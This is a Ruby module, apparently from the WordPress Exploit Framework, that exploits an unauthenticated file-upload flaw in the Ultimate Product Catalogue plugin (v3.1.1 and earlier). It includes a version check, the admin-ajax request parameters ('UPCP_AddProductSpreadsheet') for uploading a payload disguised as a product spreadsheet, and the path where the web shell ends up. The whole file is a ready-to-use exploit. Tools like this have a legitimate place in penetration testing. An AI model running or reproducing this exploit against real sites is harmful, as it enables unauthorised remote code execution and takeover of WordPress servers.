# frozen_string_literal: true

class Wpxf::Exploit::UltimateProductCatalogueShellUpload < Wpxf::Module
  include Wpxf::WordPress::ShellUpload

  def initialize
    super

    update_info(
      name: 'Ultimate Product Catalogue <= v3.1.1 Unauthenticated Shell Upload',
      author: [
        'LUCA ERCOLI ', # Discovery and disclosure
        'rastating'     # WPXF module
      ],
      references: [
        ['WPVDB', '7939'],
        ['URL', 'https://blog.seeweb.it/wordpress-ultimate-product-catalogue-vulnerability/']
      ],
      date: 'Apr 22 2015'
    )
  end

  def check
    check_plugin_version_from_changelog('ultimate-product-catalogue', 'readme.txt', '3.1.2')
  end

  def uploader_url
    wordpress_url_admin_ajax
  end

  def payload_body_builder
    builder = Utility::BodyBuilder.new
    builder.add_file_from_string('Products_Spreadsheet', payload.encoded, payload_name)
    builder
  end

  def upload_request_params
    {
      'action' => 'widgets_init',
      'Action' => 'UPCP_AddProductSpreadsheet'
    }
  end

  def uploaded_payload_location
    normalize_uri(wordpress_url_plugins, 'ultimate-product-catalogue', 'product-sheets', payload_name)
  end
end
